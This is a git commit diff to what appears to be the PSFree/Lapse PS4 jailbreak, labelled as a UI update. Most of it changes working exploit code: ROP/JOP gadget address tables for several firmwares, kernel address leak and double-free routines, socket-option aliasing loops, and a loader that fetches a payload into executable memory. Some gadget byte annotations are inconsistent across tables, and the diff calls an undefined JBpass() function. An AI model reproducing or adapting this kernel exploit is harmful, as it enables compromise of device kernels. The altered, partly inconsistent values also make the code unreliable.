e3ebefc0f5da033cc4d0dd81a6e931f257f67493
rezaadi0105 <rezaadipangestu5@gmail.com>
2026-08-29 10:24:39 +0700

    PSFree: Updates UI
    UI from psphive
    
    Signed-off-by: rezaadi0105 <rezaadipangestu5@gmail.com>

---
+++ files/payloads/js/goldhen_versions.js
@@ -0,0 +1,189 @@
+var goldhenVersions = [
+  {
+    "value": "",
+    "text": "Select A Version From The List Below:",
+    "fw": ["9.xx","8.xx","7.xx"],
+    "disabled": true,
+    "selected": true
+  },
+    {
+    "value": "v2.4b18.10",
+    "text": "v2.4b18.10 - 29 May 2026 *Last Version*",
+    "fw": ["9.xx","8.xx","7.xx"]
+  },
+  {
+    "value": "v2.4b18.9",
+    "text": "v2.4b18.9 - 12 February 2026",
+    "fw": ["9.xx","8.xx","7.xx"]
+  },
+  {
+    "value": "v2.4b18.8",
+    "text": "v2.4b18.8 - 28 January 2026",
+    "fw": ["9.xx","8.xx","7.xx"]
+  },
+  {
+    "value": "v2.4b18.7",
+    "text": "v2.4b18.7 - 24 November 2025",
+    "fw": ["9.xx","8.xx","7.xx"]
+  },
+  {
+    "value": "v2.4b18.6",
+    "text": "v2.4b18.6 - 02 September 2025",
+    "fw": ["9.xx","8.xx","7.xx"]
+  },
+  {
+    "value": "v2.4b18.5",
+    "text": "v2.4b18.5 - 04 August 2025",
+    "fw": ["9.xx","8.xx","7.xx"]
+  },
+   {
+    "value": "v2.4b18.4",
+    "text": "v2.4b18.4 - 02 July 2025",
+    "fw": ["9.00","9.03","9.60"]
+  },
+  {
+    "value": "v2.4b18.3",
+    "text": "v2.4b18.3 - 20 March 2025",
+    "fw": ["9.00","9.03","9.60"]
+  },
+  {
+    "value": "v2.4b18.2",
+    "text": "v2.4b18.2 - 23 December 2024",
+    "fw": ["9.00","9.60"]
+  },
+  {
+    "value": "v2.4b18",
+    "text": "v2.4b18 - 28 October 2024",
+    "fw": ["9.00","9.60"]
+  },
+  {
+    "value": "v2.4b17.3",
+    "text": "v2.4b17.3 - 12 June 2024",
+    "fw": ["9.00","9.60"]
+  },
+  {
+    "value": "v2.4b17.2",
+    "text": "v2.4b17.2 - 20 May 2024",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.4b17",
+    "text": "v2.4b17 - 8 May 2024",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.4b16.2",
+    "text": "v2.4b16.2 - 01 February 2024",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.4b16",
+    "text": "v2.4b16 - 31 January 2024",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.4b15",
+    "text": "v2.4b15 - 30 January 2024",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.4b14",
+    "text": "v2.4b14 - 20 June 2023",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.4b13",
+    "text": "v2.4b13 - 15 April 2023",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.4b5",
+    "text": "v2.4b5 - 28 March 2023",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.3",
+    "text": "v2.3 - 24 December 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.5b8",
+    "text": "v2.2.5b8 - 08 December 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.5b7",
+    "text": "v2.2.5b7 - 27 October 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.5b6",
+    "text": "v2.2.5b6 - 01 October 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.5b2",
+    "text": "v2.2.5b2 - 30 September 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.4",
+    "text": "v2.2.4 - 07 September 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.3",
+    "text": "v2.2.3 - 01 September 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.3b2",
+    "text": "v2.3b2 - 29 June 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.3b1",
+    "text": "v2.3b1 - 28 June 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.2",
+    "text": "v2.2.2 - 24 March 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2.1",
+    "text": "v2.2.1 - 20 March 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.2",
+    "text": "v2.2 - 09 March 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.1.2",
+    "text": "v2.1.2 - 17 February 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.1.1",
+    "text": "v2.1.1 - 03 February 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.1",
+    "text": "v2.1 - 01 February 2022",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.0b2",
+    "text": "v2.0b2 - 19 December 2021",
+    "fw": ["9.00"]
+  },
+  {
+    "value": "v2.0b",
+    "text": "v2.0b - 23 November 2021",
+    "fw": ["9.00"]
+  }
+];
--- src/bundle.js
+++ src/bundle.js
@@ -683,7 +683,7 @@ class Reader {
 // added due to reasons such as "undefined is returned by default if the
 // function exits without returning anything"
 async function leak_code_block(reader, bt_size) {
-  const num_leaks = 0x100;
+  const num_leaks = 400;
   const rdr = reader;
   const bt = [];
   // take into account the cell and indexing header of the immutable
@@ -2783,15 +2783,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019daaeb, // `41 5d c3`
         "pop r14; ret": 0x000000000003c986, // `41 5e c3`
         "pop r15; ret": 0x000000000024be8c, // `41 5f c3`
-      
         "ret": 0x000000000000003c, // `c3`
         "leave; ret": 0x00000000000f2c93, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000002e852, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x00000000000203e9, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x0000000000020148, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x0000000000294dcc, // `89 30 c3`
-      
         [jop8]: 0x00000000019c2500, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x00000000007776e0, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x0000000000f84031, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2827,15 +2824,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019ccebb, // `41 5d c3`
         "pop r14; ret": 0x000000000003c826, // `41 5e c3`
         "pop r15; ret": 0x000000000024d2af, // `41 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x000000000025654b, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000002e592, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000005becb, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x00000000000201c4, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x00000000002951bc, // `89 30 c3`
-      
         [jop8]: 0x00000000019b4c80, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x000000000077b420, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x0000000000f87995, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2871,15 +2865,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019a0edb, // `41 5d c3`
         "pop r14; ret": 0x000000000003bd76, // `41 5e c3`
         "pop r15; ret": 0x00000000002499df, // `41 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x0000000000291fd7, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000002dc62, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000005b1bb, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x000000000001f864, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x00000000002915bc, // `89 30 c3`
-      
         [jop8]: 0x0000000001988320, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x000000000076b970, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x0000000000f62f95, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2914,15 +2905,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
         "pop r14; ret": 0x0000000000050877, // `41 5e c3`
         "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x000000000001ba53, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
-      
         [jop8]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2958,19 +2946,15 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000001da461, // `47 5d c3`
         "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
         "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x000000000008db5b, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
-      
         [jop1]: 0x00000000004e62a4,
         [jop2]: 0x00000000021fce7e,
         [jop3]: 0x00000000019becb4,
-      
         [jop4]: 0x0000000000683800,
         [jop5]: 0x0000000000303906,
         [jop6]: 0x00000000028bd332,
@@ -3004,19 +2988,15 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
         "pop r14; ret": 0x000000000028c900, // `41 5e c3`
         "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x0000000000056322, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
-      
         [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
         [jop11]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
         [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`
-      
         [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
         [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
         [jop6]: 0x00000000002b7a9c, // `52 ff 20`
@@ -3170,7 +3150,7 @@ const sizeof_cpuset_t_ = 16;
 const main_core = 7;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 100;
+const num_alias = 400;
 const num_races = 100;
 const leak_len = 16;
 const num_clobbers = 8;
@@ -3716,7 +3696,7 @@ function leak_kernel_addrs(sd_pair) {
   const leak_ids_len = num_handles * num_elems;
   const leak_ids = new View4(leak_ids_len);
   const leak_ids_p = leak_ids.addr;
-  const num_leaks_kernel = 30;
+  const num_leaks_kernel = 400;
   //log('find aio_entry');
   var reqs2_off = null;
   var found = 0;
@@ -3793,8 +3773,7 @@ function leak_kernel_addrs(sd_pair) {
 //================================================================================================
 function make_aliased_pktopts(sds) {
   const tclass = new Word();
-  const pktopts_loopcnt = 1;
-  for (var loop = 0; loop < pktopts_loopcnt; loop++) {
+  for (var loop = 0; loop < num_alias; loop++) {
     for (var i = 0; i < num_sds; i++) {
       setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
     }
@@ -4491,7 +4470,7 @@ function array_from_address(addr, size) {
 // The flags 'PROT_READ | PROT_WRITE | PROT_EXEC' (RWX) are critical.
 // This makes the memory Readable, Writable, and EXECUTABLE.
 // This is a dangerous practice and is blocked by security measures in normal environments.
-async function PayloadLoader(Pfile) {
+async function PayloadLoader(PLfile) {
   try {
     /*
     // Fetch the payload from payload.js
@@ -4506,9 +4485,9 @@ async function PayloadLoader(Pfile) {
     paddedBuffer.set(PLD, 0);
     */
     // Fetch the payload file (e.g., payload.bin) from the server
-    const response = await fetch(Pfile);
+    const response = await fetch(PLfile);
     if (!response.ok) {
-      throw new Error(`Payload ${Pfile} file read error: ${response.status}`);
+      throw new Error(`Payload ${PLfile} file read error: ${response.status}`);
     }
     var PLD = await response.arrayBuffer(); // Read the downloaded payload as an ArrayBuffer.
     // Calculate required padding to ensure the data length is a multiple of 4 bytes.
@@ -4667,9 +4646,11 @@ async function doLapseExploit() {
     await sleep(50); // Wait 50ms
     sd_pair_main = double_free_reqs2(sds);
     window.log('Lapse STAGE 2/5: Leak kernel addresses');
+    window.log('If stuck 7 seconds, shutdown your console');
     await sleep(50); // Wait 50ms
     const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair_main);
     window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
+    window.log('If stuck 7 seconds, shutdown your console');
     await sleep(50); // Wait 50ms
     [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair_main[0], sds);
     window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
@@ -4727,7 +4708,7 @@ function checkPlatformIsSupported() {
   var fwVersion = match[2]; // "9.00", "9.03", etc.
   // Convert "9.00" to 0x900
   config_target = parseInt(fwVersion.replace('.', ''), 16);
-  window.log("Detected FW: PS" + device + " v" + fwVersion + ", Exploit Version: v2.3\n");
+  window.log("Detected FW: PS" + device + " v" + fwVersion + ", Exploit Version: v1.5.4\n");
   // Supported FW lists
   var supportedFW = {
     "4": ["0.00",
@@ -4742,7 +4723,7 @@ function checkPlatformIsSupported() {
   return supportedFW[device].indexOf(fwVersion) !== -1;
 }
 // Main Jailbreak Function
-async function doJailBreak() {
+async function doJBwithPSFreeLapseExploit() {
   if (!checkPlatformIsSupported()) {
     window.log("Unsupported platform detected! Designed for PS4 [7.00 - 9.60]", "red");
     /*
@@ -4785,17 +4766,16 @@ async function doJailBreak() {
     jb_step_status = await doLapseExploit();
     if (jb_step_status !== 1) return;
     await sleep(500); // Wait 500ms
-    // Inject HEN payload
-    jb_step_status = await PayloadLoader("payload.bin"); // Read payload from .bin file
+    jb_step_status = await JBpass();
     if (jb_step_status !== 1) {
       window.log("Failed to load HEN!\nPlease restart console and try again...", "red");
       return;
     }
-    window.log("Homebrew Enabler loaded", "green");
-    window.log("\nPSFree & Lapse exploit with AIO fixes by ABC");
   }
   else {
     window.log("Kernel Exploit not implemented!", "red");
   }
 }
+//================================================================================================
+// End of File ===================================================================================
 //================================================================================================
